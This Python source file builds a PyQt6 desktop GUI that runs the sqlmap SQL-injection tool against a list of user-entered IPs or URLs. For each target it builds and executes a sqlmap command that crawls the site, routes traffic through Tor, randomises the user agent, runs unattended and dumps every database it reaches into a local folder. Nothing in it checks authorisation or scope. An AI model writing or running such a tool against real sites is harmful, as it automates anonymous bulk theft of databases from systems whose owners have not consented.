from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QLabel, QLineEdit, QPushButton,
    QVBoxLayout, QHBoxLayout, QComboBox, QTextEdit, QFileDialog, QSpinBox
)
from PyQt6.QtCore import Qt
import sys
import os
import subprocess
import datetime

class SQLMapGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("SQLMap Automation Tool")
        self.setGeometry(200, 200, 800, 600)
        self.initUI()

    def initUI(self):
        layout = QVBoxLayout()

        # IP
        self.ip_input = QLineEdit()
        self.ip_input.setPlaceholderText("Enter IP or URL (comma-separated)")
        layout.addWidget(QLabel("Target(s):"))
        layout.addWidget(self.ip_input)

        # Method
        self.method_box = QComboBox()
        self.method_box.addItems(["GET", "POST"])
        layout.addWidget(QLabel("HTTP Method:"))
        layout.addWidget(self.method_box)

        # Data
        self.data_input = QLineEdit()
        self.data_input.setPlaceholderText("id=1&name=admin")
        layout.addWidget(QLabel("POST Data (if applicable):"))
        layout.addWidget(self.data_input)

        # Crawl Depth and Threads
        hbox = QHBoxLayout()
        self.crawl_spin = QSpinBox()
        self.crawl_spin.setRange(1, 20)
        self.crawl_spin.setValue(5)
        self.thread_spin = QSpinBox()
        self.thread_spin.setRange(1, 10)
        self.thread_spin.setValue(2)
        hbox.addWidget(QLabel("Crawl Depth:"))
        hbox.addWidget(self.crawl_spin)
        hbox.addWidget(QLabel("Threads:"))
        hbox.addWidget(self.thread_spin)
        layout.addLayout(hbox)

        # Cookies
        self.cookie_input = QLineEdit()
        layout.addWidget(QLabel("Cookie (optional):"))
        layout.addWidget(self.cookie_input)

        # SQLMap path (for Windows)
        self.path_input = QLineEdit()
        self.path_button = QPushButton("Browse sqlmap.py")
        self.path_button.clicked.connect(self.browse_sqlmap)
        path_layout = QHBoxLayout()
        path_layout.addWidget(self.path_input)
        path_layout.addWidget(self.path_button)
        layout.addWidget(QLabel("SQLMap.py Path (Windows only):"))
        layout.addLayout(path_layout)

        # Output
        self.output_box = QTextEdit()
        self.output_box.setReadOnly(True)
        layout.addWidget(QLabel("Scan Output:"))
        layout.addWidget(self.output_box)

        # Scan button
        self.scan_button = QPushButton("Start Scan")
        self.scan_button.clicked.connect(self.start_scan)
        layout.addWidget(self.scan_button)

        container = QWidget()
        container.setLayout(layout)
        self.setCentralWidget(container)

    def browse_sqlmap(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Select sqlmap.py")
        self.path_input.setText(file_path)

    def start_scan(self):
        targets = self.ip_input.text().strip().split(",")
        method = self.method_box.currentText()
        data = self.data_input.text().strip()
        crawl = str(self.crawl_spin.value())
        threads = str(self.thread_spin.value())
        cookies = self.cookie_input.text().strip()
        sqlmap_path = self.path_input.text().strip()
        os_type = os.name

        for ip in targets:
            ip = ip.strip()
            ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            folder = f"sqlmap_op/sqlmap_{ip.replace('.', '_')}_{ts}"
            os.makedirs(folder, exist_ok=True)

            if os_type == 'nt':
                cmd = ["python", sqlmap_path, "-u", f"http://{ip}", "--threads", threads, "--crawl", crawl,
                       "--batch", "--level=2", "--risk=2", "--tor", "--dump-all", "--random-agent", "--output-dir", folder, "--banner"]
            else:
                cmd = ["sqlmap", "-u", f"http://{ip}", "--threads", threads, "--crawl", crawl,
                       "--batch", "--level=2", "--risk=2", "--tor", "--dump-all", "--random-agent", "--output-dir", folder, "--banner"]

            if method == "POST":
                cmd.extend(["--data", data])
            if cookies:
                cmd.extend(["--cookie", cookies])

            try:
                result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                self.output_box.append(f"[+] Output for {ip}:\n{result.stdout}")
            except Exception as e:
                self.output_box.append(f"[!] Error running SQLMap on {ip}: {e}")

if __name__ == "__main__":
    app = QApplication(sys.argv)
    gui = SQLMapGUI()
    gui.show()
    sys.exit(app.exec())
